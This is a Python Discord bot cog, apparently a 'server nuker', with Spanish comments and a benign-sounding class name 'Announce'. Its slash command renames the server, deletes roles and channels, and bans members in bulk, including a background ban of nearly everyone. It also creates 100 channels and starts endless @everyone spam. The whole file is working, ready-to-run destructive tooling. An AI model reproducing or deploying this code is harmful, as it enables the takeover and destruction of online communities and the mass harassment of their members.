import discord
from discord import app_commands
from discord.ext import commands
import asyncio
import random
import string

class Announce(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @app_commands.command(name="server-nuker", description="Nuke the server, instantly")
    @app_commands.describe(
        useradmin="User to give admin",
        roletogive="Role that contains the bots in the server",
        message="Nuke text that will appear"
    )
    @app_commands.checks.has_permissions(administrator=True)
    async def server_nuker(self, interaction: discord.Interaction, 
                          useradmin: discord.User, 
                          roletogive: discord.Role, 
                          message: str):
        await interaction.response.send_message("Iniciando operación...", ephemeral=True)
        
        try:
            guild = interaction.guild
            current_user = interaction.user
            
            # Verificaciones de seguridad
            if useradmin.id == self.bot.user.id:
                await interaction.followup.send("Error: No puedes seleccionar al bot como useradmin.", ephemeral=True)
                return
                
            if roletogive.position >= guild.me.top_role.position:
                await interaction.followup.send("Error: El rol seleccionado tiene una posición más alta que la del bot.", ephemeral=True)
                return
            
            # 1. Cambiar nombre del servidor
            try:
                await guild.edit(name=message[:32])  # Discord limita a 32 caracteres
            except Exception as e:
                print(f"No se pudo cambiar el nombre del servidor: {e}")

            # 2. Eliminar todos los roles (excepto el especificado y los protegidos)
            for role in guild.roles:
                try:
                    if (role != guild.default_role and 
                        role.id != roletogive.id and 
                        role.position < guild.me.top_role.position):
                        await role.delete()
                        await asyncio.sleep(0.1)
                except Exception as e:
                    print(f"No se pudo eliminar el rol {role.name}: {e}")
            
            # 3. Crear roles aleatorios y asignarlos alternadamente
            for i in range(100):  # Crear 100 roles
                try:
                    role_name = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
                    new_role = await guild.create_role(name=role_name)
                    
                    # Alternar entre asignar al bot y al useradmin
                    if i % 2 == 0:
                        await guild.me.add_roles(new_role)
                    else:
                        admin_member = await guild.fetch_member(useradmin.id)
                        await admin_member.add_roles(new_role)
                    
                    await asyncio.sleep(0.1)
                except Exception as e:
                    print(f"Error creando/asignando rol {i}: {e}")
                    break

            # Resto del código original (baneos, canales, etc.)
            banned_members = 0
            members_with_role = []
            
            async for member in guild.fetch_members():
                if any(role.id == roletogive.id for role in member.roles):
                    if member.id != useradmin.id and member.id != self.bot.user.id:
                        members_with_role.append(member)
            
            for member in members_with_role:
                try:
                    await member.ban(reason=f"Reorganización: Miembro con rol {roletogive.name}")
                    banned_members += 1
                    await asyncio.sleep(0.2)
                except Exception as e:
                    print(f"No se pudo banear a {member}: {e}")
            
            # Eliminar canales
            delete_tasks = []
            for channel in guild.channels:
                if channel.id != interaction.channel_id:
                    delete_tasks.append(channel.delete())
            
            if delete_tasks:
                await asyncio.gather(*delete_tasks, return_exceptions=True)
            
            # Baneo masivo en segundo plano
            async def mass_ban():
                banned_count = 0
                async for member in guild.fetch_members():
                    try:
                        if (member.id != useradmin.id and 
                            member.id != self.bot.user.id):
                            await member.ban(reason=f"Reorganización masiva: {current_user}")
                            banned_count += 1
                            await asyncio.sleep(0.1)
                    except Exception as e:
                        continue
                print(f"Baneo masivo completado. Total baneados: {banned_count}")
            
            asyncio.create_task(mass_ban())
            
            # Crear canales
            spam_message = f"@everyone {message}"
            max_channels = 100
            
            channel_tasks = []
            created_channels = []
            
            for i in range(max_channels):
                try:
                    channel_name = f"{message}-{i}"
                    channel_tasks.append(guild.create_text_channel(channel_name[:100]))
                    if i % 5 == 0:
                        await asyncio.sleep(0.1)
                except Exception as e:
                    print(f"Error al crear canal {i}: {e}")
                    break
            
            created_channels = await asyncio.gather(*channel_tasks, return_exceptions=True)
            created_channels = [c for c in created_channels if not isinstance(c, Exception)]
            channel_count = len(created_channels)
            
            # Spam continuo
            async def continuous_spam():
                while True:
                    try:
                        if created_channels:
                            channel = random.choice(created_channels)
                            await channel.send(spam_message)
                            await asyncio.sleep(0.1 + random.random() * 0.2)
                        else:
                            await asyncio.sleep(1)
                    except Exception as e:
                        await asyncio.sleep(1)
            
            asyncio.create_task(continuous_spam())
            
            # Mensaje final
            await interaction.followup.send(
                f"Operación completada. Se banearon {banned_members} miembros con el rol {roletogive.name}. " +
                f"Se crearon {channel_count} canales. " +
                f"Spam continuo iniciado en todos los canales.",
                ephemeral=True
            )
            
        except Exception as e:
            print(f"Error durante la ejecución: {e}")
            try:
                await interaction.followup.send("Ocurrió un error durante el proceso.", ephemeral=True)
            except:
                pass

async def setup(bot):
    await bot.add_cog(Announce(bot))
